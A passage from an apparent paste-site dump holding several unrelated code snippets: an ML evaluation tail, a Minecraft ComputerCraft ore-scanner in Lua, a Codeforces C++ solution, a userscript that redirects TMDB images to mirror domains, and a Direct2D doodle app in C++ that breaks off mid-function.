    fpr, tpr, _ = roc_curve(y_test, y_probs)
    roc_auc = auc(fpr, tpr)
    plt.plot(fpr, tpr, label=f'ROC Curve (AUC = {roc_auc:.2f})')
    plt.plot([0, 1], [0, 1], linestyle='--')
    plt.xlabel(""False Positive Rate"")
    plt.ylabel(""True Positive Rate"")
    plt.title(""ROC Curve"")
    plt.legend()
    plt.show()

# Example usage
if __name__ == ""__main__"":
    target_column = ""target""
    
    df = load_data()
    X_train, X_test, y_train, y_test = split_data(df, target_column)
    X_train, X_test = scale_features(X_train, X_test)
    
    model = train_decision_tree(X_train, y_train)
    y_pred = make_predictions(model, X_test)
    
    evaluate_model(y_test, y_pred)
    plot_confusion_matrix(y_test, y_pred)
    
    y_probs = model.predict_proba(X_test)[:, 1]
    plot_roc_curve(y_test, y_probs)
"
HSYZKMvk,Testing WIP,Rukus308,Lua,Sunday 23rd of March 2025 04:00:27 AM CDT,"local scanner = peripheral.find(""geoScanner"")

if not scanner then
    print(""No GeoScanner found! Attach a GeoScanner and try again."")
    return
end

print(""Enter scan radius (max 8 recommended):"")
local radius = tonumber(read())

if not radius or radius < 1 or radius > 8 then
    print(""Invalid radius. Using default of 8."")
    radius = 8
end

-- Ore color mappings
local oreColors = {
    [""minecraft:coal_ore""] = colors.gray,
    [""minecraft:iron_ore""] = colors.orange,
    [""minecraft:gold_ore""] = colors.yellow,
    [""minecraft:diamond_ore""] = colors.cyan,
    [""minecraft:redstone_ore""] = colors.red,
    [""minecraft:lapis_ore""] = colors.blue,
    [""minecraft:emerald_ore""] = colors.green,
    [""minecraft:nether_quartz_ore""] = colors.white,
    [""minecraft:copper_ore""] = colors.brown
}

print(""Scanning continuously... Press Ctrl + T to stop."")

while true do
    local blocks = scanner.scan(radius)
    if not blocks then
        print(""Scan failed. Retrying..."")
        sleep(5)
        goto continue
    end

    -- Clear the screen
    term.setBackgroundColor(colors.black)
    term.clear()

    -- Get screen size
    local width, height = term.getSize()
    local centerX, centerY = math.floor(width / 2) + 1, math.floor(height / 2) + 1  -- Centering correction

    -- Draw scan border
    term.setTextColor(colors.white)
    for dx = -radius, radius do
        paintutils.drawPixel(centerX + dx, centerY - radius, colors.white) -- Top border
        paintutils.drawPixel(centerX + dx, centerY + radius, colors.white) -- Bottom border
    end
    for dz = -radius, radius do
        paintutils.drawPixel(centerX - radius, centerY + dz, colors.white) -- Left border
        paintutils.drawPixel(centerX + radius, centerY + dz, colors.white) -- Right border
    end

    -- Draw detected ores with correct X/Z mapping
    for _, block in ipairs(blocks) do
        if oreColors[block.name] then
            local x = centerX + block.x  -- Left/Right
            local y = centerY + block.z  -- Forward/Backward (mapped to screen Y)

            -- Only draw within the screen bounds
            if x >= 1 and x <= width and y >= 1 and y <= height then
                paintutils.drawPixel(x, y, oreColors[block.name])
            end
        end
    end

    -- Draw player marker
    term.setTextColor(colors.white)
    term.setCursorPos(centerX, centerY)
    term.write(""O"") -- Player marker

    -- Reset screen colors
    term.setBackgroundColor(colors.black)
    term.setCursorPos(1, height)
    print(""Ore Map (You are centered)"")

    sleep(1)  -- Wait before the next scan
    ::continue::
end
"
5u8Th5sQ,CF1619E,pb_jiang,C++,Sunday 23rd of March 2025 02:51:58 AM CDT,"// Problem: E. MEX and Increments
// Contest: Codeforces - Codeforces Round 762 (Div. 3)
// URL: https://codeforces.com/problemset/problem/1619/E
// Memory Limit: 256 MB
// Time Limit: 2000 ms
//
// Powered by CP Editor (https://cpeditor.org)

#include <assert.h>
#include <bits/stdc++.h>
using namespace std;
#ifndef __DEBUG__
#define dbg(...) 42
#endif
template <class T> using mpq = priority_queue<T, vector<T>, greater<T>>;

using ll = long long;
using a2l = array<ll, 2>;
using pll = pair<ll, ll>;
using vl = vector<ll>;

void solve()
{
    ll n, mex = 0;
    cin >> n;
    vl a(n), cnt(n + 1);
    for (auto &x : a) {
        cin >> x;
        if (x <= n)
            cnt[x] += 1;
    }
    while (mex <= n && cnt[mex])
        ++mex;

    vl ans(n + 1, -1);
    map<ll, ll> opt;
    for (ll i = 0; i < mex; ++i) {
        ans[i] = cnt[i];
        if (cnt[i] > 1)
            opt[i] = cnt[i] - 1;
    }
    ans[mex] = 0;
    for (ll i = mex + 1, acc = 0; i <= n; ++i) {
        dbg(opt);
        if (opt.size() == 0) {
            break;
        }
        auto [k, v] = *opt.rbegin();
        acc += i - 1 - k;
        if (v == 1)
            opt.erase(k);
        else
            opt[k] -= 1;
        ans[i] = acc + cnt[i];
        if (cnt[i])
            opt[i] = cnt[i];
    }
    for (auto x : ans)
        cout << x << ' ';
    cout << '\n';
}

int main(int argc, char **argv)
{
    ll t;
    cin >> t;
    while (t--)
        solve();
    return 0;
};
"
U3Jpc6tG,TMDB Image Redirect,vitnet,JavaScript,Sunday 23rd of March 2025 02:05:46 AM CDT,"// ==UserScript==
// @name         TMDB Image Redirect
// @namespace    https://image.tmdb.org/
// @version      1.2
// @description  Заменяет ссылки на изображения TMDB на альтернативный домен
// @author       vitnet
// @match        *://*/*
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

    const imgReplace = 'https://image.tmdb.org/';
    const imgProxy = ['https://imagetmdb.cub.red/', 'https://imagetmdb.com/'];

    // Функция для получения случайного прокси-домена
    const getRandomProxy = () => {
        return imgProxy[Math.floor(Math.random() * imgProxy.length)];
    };

    // Функция для замены URL изображения
    const replaceImageUrl = (url) => {
        if (url && url.startsWith(imgReplace)) {
            return url.replace(imgReplace, getRandomProxy());
        }
        return url;
    };

    // Функция для замены атрибутов изображения
    const replaceImageSrc = (img) => {
        try {
            if (img.src) {
                img.src = replaceImageUrl(img.src);
            }
            if (img.dataset.src) {
                img.dataset.src = replaceImageUrl(img.dataset.src);
            }
            if (img.srcset) {
                img.srcset = img.srcset.replace(new RegExp(imgReplace, 'g'), getRandomProxy());
            }
            if (img.dataset.srcset) {
                img.dataset.srcset = img.dataset.srcset.replace(new RegExp(imgReplace, 'g'), getRandomProxy());
            }
            if (img.dataset.lazySrc) {
                img.dataset.lazySrc = replaceImageUrl(img.dataset.lazySrc);
            }
        } catch (error) {
            console.error('Ошибка при замене URL изображения:', error);
        }
    };

    // Обрабатываем уже загруженные изображения
    document.querySelectorAll('img').forEach(replaceImageSrc);

    // Следим за изменениями в DOM
    const observer = new MutationObserver(mutations => {
        mutations.forEach(mutation => {
            mutation.addedNodes.forEach(node => {
                if (node.tagName === 'IMG') {
                    replaceImageSrc(node);
                } else if (node.querySelectorAll) {
                    node.querySelectorAll('img').forEach(replaceImageSrc);
                }
            });
        });
    });

    observer.observe(document.body, { childList: true, subtree: true });

    // Дополнительно следим за изменением атрибутов src, data-src, data-srcset и data-lazy-src
    const attrObserver = new MutationObserver(mutations => {
        mutations.forEach(mutation => {
            if (mutation.type === 'attributes' &&
                (mutation.attributeName === 'src' ||
                 mutation.attributeName === 'data-src' ||
                 mutation.attributeName === 'data-srcset' ||
                 mutation.attributeName === 'data-lazy-src')) {
                replaceImageSrc(mutation.target);
            }
        });
    });

    document.querySelectorAll('img').forEach(img => {
        attrObserver.observe(img, { attributes: true });
    });
})();"
vJBDKqJp,Infinite Canvas Doodle Using D2D Hardw Accel (Bug fix StatBar Not Updating In RealTime),alien_fx_fiend,C++,Sunday 23rd of March 2025 01:44:13 AM CDT,"==++ Here's the full source of (file 1/1) ""Doodle-D2D-HAcc.cpp""::: ++==
```Doodle-D2D-HAcc.cpp
#define NOMINMAX
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <windowsx.h>
#include <commctrl.h>
#include <commdlg.h>
#include <d2d1.h>
#include <dwrite.h>
#include <string>  // add if not already included
#include <cmath>
#include <vector>
#include <mutex>
#include <fstream>
#include <thread>
#include <algorithm>
#include ""resource.h""

#pragma comment(lib, ""d2d1.lib"")
#pragma comment(lib, ""comctl32.lib"")

//----------------------------------------------------------------
// Data Structures and Globals
//----------------------------------------------------------------

struct DrawPoint {
    int x, y;
    DWORD timestamp;
    DrawPoint() : x(0), y(0), timestamp(0) {}
    DrawPoint(int px, int py) : x(px), y(py), timestamp(GetTickCount()) {}
};

struct SerializedStroke {
    std::vector<DrawPoint> points;
    COLORREF color;
    int brushSize;
    bool isEraser;
};

std::mutex strokeMutex;
std::vector<SerializedStroke> strokeHistory;
std::vector<DrawPoint> strokeBuffer;
const double MIN_DISTANCE = 2.0;

COLORREF currentBrushColor = RGB(24, 123, 205);
int brushSize = 10;
bool isDrawing = false;
bool isEraserMode = false;
bool isPaintbrushSelected = true;
bool isSpacePressed = false;
POINT lastMousePos = { 0, 0 };

int scrollX = 0;
int scrollY = 0;
float gridZoomFactor = 1.0f;
bool showGrid = true;
bool useAlphaGrid = false;
int gridOpacity = 255;
const int GRID_SIZE = 100;

HINSTANCE hInst;
HWND hWnd;
//HWND hStatusBar = NULL;
// Global DirectWrite objects:
IDWriteFactory* pDWriteFactory = nullptr;
IDWriteTextFormat* pTextFormat = nullptr;
std::wstring g_statusText = L"""";
// Add DirectWrite globals and a global status string:
//IDWriteFactory* pDWriteFactory = nullptr;
//IDWriteTextFormat* pTextFormat = nullptr;
DWORD lastStatusUpdateTime = 0;
const DWORD STATUS_UPDATE_INTERVAL = 50;
HDC hStatusBufferDC = NULL;
HBITMAP hStatusBufferBitmap = NULL;

// Serialization globals
const wchar_t* STATE_FILE = L""canvas_state2.bin"";
bool isLoading = false;
bool sessionDirty = false;

// For Direct2D
ID2D1Factory* pFactory = nullptr;
ID2D1HwndRenderTarget* pRenderTarget = nullptr;
ID2D1BitmapRenderTarget* pOffscreenRT = nullptr;
bool offscreenDirty = true;
int lastOffscreenScrollX = 0;
int lastOffscreenScrollY = 0;

//----------------------------------------------------------------
// Function Declarations
//----------------------------------------------------------------

void SaveCanvasState();
void LoadCanvasStateAsync(HWND hwnd);
void UpdateStatus(HWND hwnd);
void InitializeStatusBuffer(HWND hStatus);
void UpdateOffscreenBuffer(HWND hwnd);
HRESULT CreateDeviceResources(HWND hwnd);
void DiscardDeviceResources();
void DrawSmoothStroke(ID2D1RenderTarget* pRT, const std::vector<DrawPoint>& points, bool isEraser, COLORREF strokeColor, int strokeSize, int offsetX, int offsetY);
void DrawGrid(ID2D1RenderTarget* pRT, const D2D1_RECT_F& rect);

//----------------------------------------------------------------
// Serialization Functions
//----------------------------------------------------------------

void SaveCanvasState() {
    std::ofstream file(STATE_FILE, std::ios::binary | std::ios::out);
    if (!file)
        return;
    file.write(reinterpret_cast<const char*>(&gridZoomFactor), sizeof(float));
    file.write(reinterpret_cast<const char*>(&showGrid), sizeof(bool));
    file.write(reinterpret_cast<const char*>(&useAlphaGrid), sizeof(bool));
    file.write(reinterpret_cast<const char*>(&gridOpacity), sizeof(int));
    file.write(reinterpret_cast<const char*>(&currentBrushColor), sizeof(COLORREF));
    file.write(reinterpret_cast<const char*>(&brushSize), sizeof(int));
    {
        std::lock_guard<std::mutex> lock(strokeMutex);
        size_t strokeCount = strokeHistory.size();
        file.write(reinterpret_cast<const char*>(&strokeCount), sizeof(size_t));
        for (const auto& stroke : strokeHistory) {
            std::vector<DrawPoint> optimizedPoints;
            if (!stroke.points.empty()) {
                optimizedPoints.push_back(stroke.points[0]);
                for (size_t i = 1; i < stroke.points.size(); ++i) {
                    const DrawPoint& prev = optimizedPoints.back();
                    const DrawPoint& curr = stroke.points[i];
                    double dx = curr.x - prev.x;
                    double dy = curr.y - prev.y;
                    double distance = sqrt(dx * dx + dy * dy);
                    if (distance >= MIN_DISTANCE)
                        optimizedPoints.push_back(curr);
                }
            }
            size_t pointCount = optimizedPoints.size();
            file.write(reinterpret_cast<const char*>(&pointCount), sizeof(size_t));
            if (pointCount > 0)
                file.write(reinterpret_cast<const char*>(optimizedPoints.data()), pointCount * sizeof(DrawPoint));
            file.write(reinterpret_cast<const char*>(&stroke.color), sizeof(COLORREF));
            file.write(reinterpret_cast<const char*>(&stroke.brushSize), sizeof(int));
            file.write(reinterpret_cast<const char*>(&stroke.isEraser), sizeof(bool));
        }
    }
    file.close();
}

void LoadCanvasStateAsync(HWND hwnd) {
    isLoading = true;
    std::thread([hwnd]() {
        std::ifstream file(STATE_FILE, std::ios::binary | std::ios::in);
        if (!file) {
            isLoading = false;
            return;
        }
        try {
            file.read(reinterpret_cast<char*>(&gridZoomFactor), sizeof(float));
            file.read(reinterpret_cast<char*>(&showGrid), sizeof(bool));
            file.read(reinterpret_cast<char*>(&useAlphaGrid), sizeof(bool));
            file.read(reinterpret_cast<char*>(&gridOpacity), sizeof(int));
            file.read(reinterpret_cast<char*>(&currentBrushColor), sizeof(COLORREF));
            file.read(reinterpret_cast<char*>(&brushSize), sizeof(int));
            size_t strokeCount = 0;
            file.read(reinterpret_cast<char*>(&strokeCount), sizeof(size_t));
            std::vector<SerializedStroke> loadedStrokes;
            for (size_t i = 0; i < strokeCount && file.good(); ++i) {
                SerializedStroke stroke;
                size_t pointCount = 0;
                file.read(reinterpret_cast<char*>(&pointCount), sizeof(size_t));
                if (pointCount > 0 && pointCount < 1000000) {
                    for (size_t j = 0; j < pointCount; ++j) {
                        DrawPoint point;
                        file.read(reinterpret_cast<char*>(&point.x), sizeof(int));
                        file.read(reinterpret_cast<char*>(&point.y), sizeof(int));
                        file.read(reinterpret_cast<char*>(&point.timestamp), sizeof(DWORD));
                        stroke.points.push_back(point);
                    }
                    file.read(reinterpret_cast<char*>(&stroke.color), sizeof(COLORREF));
                    file.read(reinterpret_cast<char*>(&stroke.brushSize), sizeof(int));
                    file.read(reinterpret_cast<char*>(&stroke.isEraser), sizeof(bool));
                    loadedStrokes.push_back(stroke);
                }
            }
            {
                std::lock_guard<std::mutex> lock(strokeMutex);
                strokeHistory = std::move(loadedStrokes);
            }
        }
        catch (...) {
            isLoading = false;
            return;
        }
        file.close();
        isLoading = false;
        // Post a message to update offscreen buffer after loading
        PostMessage(hwnd, WM_USER + 1, 0, 0);
        }).detach();
}

//----------------------------------------------------------------
// Direct2D Initialization and Resource Management
//----------------------------------------------------------------

HRESULT CreateDeviceResources(HWND hwnd) {
    if (pRenderTarget)
        return S_OK;
    RECT rc;
    GetClientRect(hwnd, &rc);
    D2D1_SIZE_U size = D2D1::SizeU(rc.right, rc.bottom);

    HRESULT hr = pFactory->CreateHwndRenderTarget(
        D2D1::RenderTargetProperties(),
        D2D1::HwndRenderTargetProperties(hwnd, size),
        &pRenderTarget
    );
    if (SUCCEEDED(hr)) {
        // Create an offscreen compatible render target for persistent drawing.
        hr = pRenderTarget->CreateCompatibleRenderTarget(
            D2D1::SizeF((FLOAT)rc.right, (FLOAT)rc.bottom),
            &pOffscreenRT
        );
        if (SUCCEEDED(hr)) {
            // Mark offscreen as dirty so it is initially updated.
            offscreenDirty = true;
            lastOffscreenScrollX = scrollX;
            lastOffscreenScrollY = scrollY;
        }
    }
    return hr;
}

void DiscardDeviceResources() {
    if (pOffscreenRT) {
        pOffscreenRT->Release();
        pOffscreenRT = nullptr;
    }
    if (pRenderTarget) {
        pRenderTarget->Release();
        pRenderTarget = nullptr;
    }
}

//----------------------------------------------------------------
// Drawing Functions (Direct2D versions)
//----------------------------------------------------------------

void DrawSmoothStroke(ID2D1RenderTarget* pRT, const std::vector<DrawPoint>& points, bool isEraser, COLORREF strokeColor, int strokeSize, int offsetX, int offsetY) {
    if (points.empty())
        return;

    // Determine color; for eraser use white.
    D2D1_COLOR_F color = isEraser ? D2D1::ColorF(D2D1::ColorF::White) :
        D2D1::ColorF(
            GetRValue(strokeColor) / 255.0f,
            GetGValue(strokeColor) / 255.0f,
            GetBValue(strokeColor) / 255.0f
        );

    ID2D1SolidColorBrush* pBrush = nullptr;
    if (FAILED(pRT->CreateSolidColorBrush(color, &pBrush)))
        return;

    if (points.size() == 1) {
        const DrawPoint& pt = points[0];
        D2D1_ELLIPSE ellipse = D2D1::Ellipse(
            D2D1::Point2F((FLOAT)(pt.x - offsetX), (FLOAT)(pt.y - offsetY)),
            (FLOAT)brushSize, (FLOAT)brushSize);
        pRT->FillEllipse(ellipse, pBrush);
    }
    else {
        for (size_t i = 1; i < points.size(); ++i) {
            const DrawPoint& prev = points[i - 1];
            const DrawPoint& curr = points[i];
            double dx = curr.x - prev.x;
            double dy = curr.y - prev.y;
            double distance = sqrt(dx * dx + dy * dy);
            if (distance > 0) {
                int steps = std::max(1, (int)(distance / 2));
                for (int step = 0; step <= steps; ++step) {
                    double t = step / (double)steps;
                    int x = (int)(prev.x + dx * t);
                    int y = (int)(prev.y + dy * t);
                    D2D1_ELLIPSE ellipse = D2D1::Ellipse(
                        D2D1::Point2F((FLOAT)(x - offsetX), (FLOAT)(y - offsetY)),
                        (FLOAT)brushSize, (FLOAT)brushSize);
                    pRT->FillEllipse(ellipse, pBrush);
                }
            }
        }
    }
    pBrush->Release();
}

void DrawGrid(ID2D1RenderTarget* pRT, const D2D1_RECT_F& rect) {
    // Use a solid orange color for grid lines.
    ID2D1SolidColorBrush* pGridBrush = nullptr;
    pRT->CreateSolidColorBrush(D2D1::ColorF(1.0f, 0.55f, 0.0f), &pGridBrush);
    int scaledGridSize = (int)(GRID_SIZE * gridZoomFactor);
    // Compute starting positions based on scroll offsets.
    int modX = scrollX % scaledGridSize;
    if (modX < 0)
        modX += scaledGridSize;
    float startX = -modX;
    for (float x = startX; x < rect.right; x += scaledGridSize) {
        pRT->DrawLine(D2D1::Point2F(x, rect.top), D2D1::Point2F(x, rect.bottom), pGridBrush, 1.0f);
    }
    int modY = scrollY % scaledGridSize;
    if (modY < 0)
        modY += scaledGridSize;
    float startY = -modY;
    for (float y = startY; y < rect.bottom; y += scaledGridSize) {
        pRT->DrawLine(D2D1::Point2F(rect.left, y), D2D1::Point2F(rect.right, y), pGridBrush, 1.0f);
    }
    pGridBrush->Release();
}

//----------------------------------------------------------------
// Offscreen Buffer Update (using pOffscreenRT)
//----------------------------------------------------------------

void UpdateOffscreenBuffer(HWND hwnd) {
    if (!pOffscreenRT)
        return;
    pOffscreenRT->BeginDraw();
    // Clear offscreen render target to white.
    pOffscreenRT->Clear(D2D1::ColorF(D2D1::ColorF::White));
    // Redraw all strokes.
    {
        std::lock_guard<std::mutex> lock(strokeMutex);
        for (const auto& stroke : strokeHistory) {
            DrawSmoothStroke(pOffscreenRT, stroke.points, stroke.isEraser, stroke.color, stroke.brushSize, scrollX, scrollY);
        }
    }
    HRESULT hr = pOffscreenRT->EndDraw();
    // Mark offscreen as clean.
    offscreenDirty = false;
    lastOffscreenScrollX = scrollX;
    lastOffscreenScrollY = scrollY;
}

//----------------------------------------------------------------
// Status Bar Functions (GDI remains unchanged)
//----------------------------------------------------------------

void InitializeStatusBuffer(HWND hStatus) {
    if (hStatusBufferDC) {
        DeleteDC(hStatusBufferDC);
        DeleteObject(hStatusBufferBitmap);
    }
    HDC hdc = GetDC(hStatus);
    RECT rect;
    GetClientRect(hStatus, &rect);
    hStatusBufferDC = CreateCompatibleDC(hdc);
    hStatusBufferBitmap = CreateCompatibleBitmap(hdc, rect.right, rect.bottom);
    SelectObject(hStatusBufferDC, hStatusBufferBitmap);
    ReleaseDC(hStatus, hdc);
}

void UpdateStatus(HWND hwnd) {
    DWORD currentTime = GetTickCount();
    if (currentTime - lastStatusUpdateTime < STATUS_UPDATE_INTERVAL)
        return;
    lastStatusUpdateTime = currentTime;
    wchar_t status[512];
    BYTE r = GetRValue(currentBrushColor);
    BYTE g = GetGValue(currentBrushColor);
    BYTE b = GetBValue(currentBrushColor);
    swprintf_s(status, 512,
        L""Mode: %s | Brush: %d | Color: RGB(%d,%d,%d) | Grid: %s%s | Zoom: %.1fx | Opacity: %d%% | Canvas Pos: (%d,%d)"",
        isEraserMode ? L""Eraser"" : L""Draw"",
        brushSize,
        r, g, b,
        showGrid ? L""On"" : L""Off"",
        useAlphaGrid ? L""(Alpha)"" : L"""",
        gridZoomFactor,
        (gridOpacity * 100) / 255,
        scrollX, scrollY
    );
    g_statusText = status;
}

/* void UpdateStatus(HWND hwnd) {
    DWORD currentTime = GetTickCount();
    if (currentTime - lastStatusUpdateTime < STATUS_UPDATE_INTERVAL)
        return;
    lastStatusUpdateTime = currentTime;
    if (!hStatusBar)
        return;
    if (!hStatusBufferDC) {
        InitializeStatusBuffer(hStatusBar);
    }
    RECT statusRect;
    GetClientRect(hStatusBar, &statusRect);
    wchar_t status[512];
    BYTE r = GetRValue(currentBrushColor);
    BYTE g = GetGValue(currentBrushColor);
    BYTE b = GetBValue(currentBrushColor);
    swprintf_s(status, 512,
        L""Mode: %s | Brush: %d | Color: RGB(%d,%d,%d) | Grid: %s%s | Zoom: %.1fx | Opacity: %d%% | Canvas Pos: (%d,%d)"",
        isEraserMode ? L""Eraser"" : L""Draw"",
        brushSize,
        r, g, b,
        showGrid ? L""On"" : L""Off"",
        useAlphaGrid ? L""(Alpha)"" : L"""",
        gridZoomFactor,
        (gridOpacity * 100) / 255,
        scrollX, scrollY
    );
    SendMessage(hStatusBar, SB_SETTEXT, 0, (LPARAM)status);
} */

//----------------------------------------------------------------
// Window Procedure
//----------------------------------------------------------------

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    HRESULT hr;
    switch (uMsg) {
    case WM_CREATE:
    {
        // Initialize Direct2D Factory
        HRESULT hr = D2D1CreateFactory(D2D1_FACTORY_TYPE_SINGLE_THREADED, &pFactory);
        if (FAILED(hr))
            return -1;

        // Initialize DirectWrite Factory and Text Format for the status text.
        HRESULT hrDWrite = DWriteCreateFactory(
            DWRITE_FACTORY_TYPE_SHARED,
            __uuidof(IDWriteFactory),
            reinterpret_cast<IUnknown**>(&pDWriteFactory)
        );
        if (SUCCEEDED(hrDWrite))
        {
            hrDWrite = pDWriteFactory->CreateTextFormat(
                L""Segoe UI"",                // Font family name.
                NULL,                       // Use system font collection.
                DWRITE_FONT_WEIGHT_NORMAL,
                DWRITE_FONT_STYLE_NORMAL,
                DWRITE_FONT_STRETCH_NORMAL,
                14.0f,                      // Font size.
                L"""",                        // Locale.
                &pTextFormat
            );
            if (SUCCEEDED(hrDWrite))
            {
                pTextFormat->SetTextAlignment(DWRITE_TEXT_ALIGNMENT_LEADING);
                pTextFormat->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_CENTER);
            }
        }

        // (Remove GDI status bar creation; status will be rendered via Direct2D.)

        // Device resources (pRenderTarget and pOffscreenRT) will be created in WM_SIZE.
        LoadCanvasStateAsync(hwnd);
        return 0;
    }
    case WM_SIZE:
    {
        RECT rcClient;
        GetClientRect(hwnd, &rcClient);

        // Resize (or create) the main render target.
        if (pRenderTarget)
        {
            pRenderTarget->Resize(D2D1::SizeU(rcClient.right, rcClient.bottom));
        }
        else
        {
            HRESULT hr = CreateDeviceResources(hwnd);
            if (FAILED(hr))
                return -1;
        }

        // Recreate the offscreen render target.
        if (pOffscreenRT)
        {
            pOffscreenRT->Release();
            pOffscreenRT = nullptr;
        }
        HRESULT hr = pRenderTarget->CreateCompatibleRenderTarget(
            D2D1::SizeF((FLOAT)rcClient.right, (FLOAT)rcClient.bottom),
            &pOffscreenRT
        );
        if (SUCCEEDED(hr))
        {
            offscreenDirty = true;               // Force update of the offscreen buffer.
            lastOffscreenScrollX = scrollX;
            lastOffscreenScrollY = scrollY;
            UpdateOffscreenBuffer(hwnd);         // Rebuild the offscreen content.
        }

        // Update status (which now contains the grid state) and force a full redraw.
        UpdateStatus(hwnd);
        InvalidateRect(hwnd, NULL, TRUE);
        return 0;
    }
        case WM_KEYDOWN:
    {
        if (GetKeyState(VK_MENU) & 0x8000)
            return DefWindowProc(hwnd, uMsg, wParam, lParam);
        // Panning using Space + Drag is handled in WM_MOUSEMOVE.
        // Additionally, allow arrow keys for panning.
        if (wParam == VK_LEFT) {
            scrollX -= 20;
            offscreenDirty = true;
            InvalidateRect(hwnd, NULL, FALSE);
        }
        else if (wParam == VK_RIGHT) {
            scrollX += 20;
            offscreenDirty = true;
            InvalidateRect(hwnd, NULL, FALSE);
        }
        else if (wParam == VK_UP) {
            scrollY -= 20;
            offscreenDirty = true;
            InvalidateRect(hwnd, NULL, FALSE);
        }
        else if (wParam == VK_DOWN) {
            scrollY += 20;
            offscreenDirty = true;
            InvalidateRect(hwnd, NULL, FALSE);
        }
        else if (wParam == VK_SPACE && !isSpacePressed) {
            isSpacePressed = true;
            GetCursorPos(&lastMousePos);
            ScreenToClient(hwnd, &lastMousePos);
            SetCursor(LoadCursor(NULL, IDC_SIZEALL));
            SetCapture(hwnd);
        }
        else if (wParam == 0x50) {
            isPaintbrushSelected = true;
            isEraserMode = false;
            UpdateStatus(hwnd);
            InvalidateRect(hwnd, NULL, TRUE);
        }
        else if (wParam == 0x45) {
            isPaintbrushSelected = false;
            isEraserMode = true;
            UpdateStatus(hwnd);
            InvalidateRect(hwnd, NULL, TRUE);
        }
        else if (wParam == 'Q') {
            CHOOSECOLOR cc = { sizeof(CHOOSECOLOR) };
            static COLORREF customColors[16] = { 0 };
            cc.hwndOwner = hwnd;
            cc.rgbResult = currentBrushColor;
            cc.lpCustColors = customColors;
            cc.Flags = CC_FULLOPEN | CC_RGBINIT;
            if (ChooseColor(&cc))
                currentBrushColor = cc.rgbResult;
            UpdateStatus(hwnd);
            offscreenDirty = true;
            InvalidateRect(hwnd, NULL, TRUE);
        }
        else if (wParam == VK_ADD || wParam == VK_OEM_PLUS) {
            brushSize = std::min(50, brushSize + 5);
            offscreenDirty = true;  // Ensure new brush size is applied in drawing.
            UpdateStatus(hwnd);
            InvalidateRect(hwnd, NULL, TRUE);
        }
        else if (wParam == VK_SUBTRACT || wParam == VK_OEM_MINUS) {
            brushSize = std::max(5, brushSize - 5);
            offscreenDirty = true;
            UpdateStatus(hwnd);
            InvalidateRect(hwnd, NULL, TRUE);
        }
        else if (wParam == 0x43) {
            std::lock_guard<std::mutex> lock(strokeMutex);
            strokeHistory.clear();
            sessionDirty = true;  // Mark session as changed.
            offscreenDirty = true;
            InvalidateRect(hwnd, NULL, TRUE);
        }
        else if (wParam == VK_HOME) {
            scrollX = 0;
            scrollY = 0;
            lastOffscreenScrollX = 0;
            lastOffscreenScrollY = 0;
            offscreenDirty = true;
            UpdateOffscreenBuffer(hwnd);
            UpdateStatus(hwnd);
            InvalidateRect(hwnd, NULL, TRUE);
        }
        else if (wParam == 'G') {
            showGrid = !showGrid;
            offscreenDirty = true;  // Mark offscreen dirty so grid redraws.
            UpdateStatus(hwnd);
            InvalidateRect(hwnd, NULL, TRUE);
        }
        else if (wParam == 'A') {
            useAlphaGrid = !useAlphaGrid;
            UpdateStatus(hwnd);
            InvalidateRect(hwnd, NULL, FALSE);
        }
        else if (wParam == VK_PRIOR) {
            gridZoomFactor *= 1.1f;
            offscreenDirty = true;
            UpdateStatus(hwnd);
            InvalidateRect(hwnd, NULL, FALSE);
        }
        else if (wParam == VK_NEXT) {
            gridZoomFactor *= 0.9f;
            if (gridZoomFactor < 0.1f)
                gridZoomFactor = 0.1f;
            offscreenDirty = true;
            UpdateStatus(hwnd);
            InvalidateRect(hwnd, NULL, FALSE);
        }
        else if (wParam == VK_OEM_6 && useAlphaGrid) {
            gridOpacity = std::min(255, gridOpacity + 15);
            offscreenDirty = true;
            UpdateStatus(hwnd);
            InvalidateRect(hwnd, NULL, FALSE);
        }
        else if (wParam == VK_OEM_4 && useAlphaGrid) {
            gridOpacity = std::max(0, gridOpacity - 15);
            offscreenDirty = true;
            UpdateStatus(hwnd);
            InvalidateRect(hwnd, NULL, FALSE);
        }
        else if (wParam == VK_ESCAPE) {
            if (isSpacePressed) {
                isSpacePressed = false;
                ReleaseCapture();
            }
            if (sessionDirty) {
                SaveCanvasState();
                sessionDirty = false;
            }
            PostQuitMessage(0);
            return 0;
        }
        else if (wParam == VK_F1) {
            MessageBox(hwnd,
                L""Infinite Canvas Doodle App (Direct2D Accelerated)\n""
                L""P=Brush, E=Eraser, C=Clear, +/-=BrushSize, Space+Drag/Arrow Keys=Panning, Home=Reset, Q=Color, G=Grid, A=Alpha, PgUp=ZoomIn, PgDn=ZoomOut, F1=About"",
                L""Information"", MB_OK | MB_ICONINFORMATION);
            return 0;
        }
        return 0;
    }
    case WM_KEYUP:
    {
        if (wParam == VK_SPACE) {
            isSpacePressed = false;
            SetCursor(LoadCursor(NULL, IDC_ARROW));
            ReleaseCapture();
            return 0;
        }
        return 0;
    }
    case WM_LBUTTONDOWN:
    {
        isDrawing = true;
        int worldX = GET_X_LPARAM(lParam) + scrollX;
        int worldY = GET_Y_LPARAM(lParam) + scrollY;
        strokeBuffer.clear();
        strokeBuffer.push_back(DrawPoint(worldX, worldY));
        SetCapture(hwnd);
        InvalidateRect(hwnd, NULL, FALSE);
        return 0;
    }
    case WM_LBUTTONUP:
    {
        if (isDrawing) {
            isDrawing = false;
            SerializedStroke stroke;
            stroke.points = strokeBuffer;
            stroke.color = currentBrushColor;
            stroke.brushSize = brushSize;
            stroke.isEraser = isEraserMode;
            {
                std::lock_guard<std::mutex> lock(strokeMutex);
                strokeHistory.push_back(stroke);
            }
            strokeBuffer.clear();
            ReleaseCapture();
            InvalidateRect(hwnd, NULL, FALSE);
            sessionDirty = true;
            if (sessionDirty) {
                SaveCanvasState();
                sessionDirty = false;
            }
            offscreenDirty = true;
            UpdateOffscreenBuffer(hwnd);
            UpdateStatus(hwnd);
        }
        return 0;
    }
    case WM_MOUSEMOVE:
    {
        int x = GET_X_LPARAM(lParam);
        int y = GET_Y_LPARAM(lParam);
        if (isSpacePressed) {
            RECT clientRect;
            GetClientRect(hwnd, &clientRect);
            int deltaX = x - lastMousePos.x;
            int deltaY = y - lastMousePos.y;
            scrollX -= deltaX;
            scrollY -= deltaY;
            lastMousePos.x = x;
            lastMousePos.y = y;
            if (scrollX != lastOffscreenScrollX || scrollY != lastOffscreenScrollY)
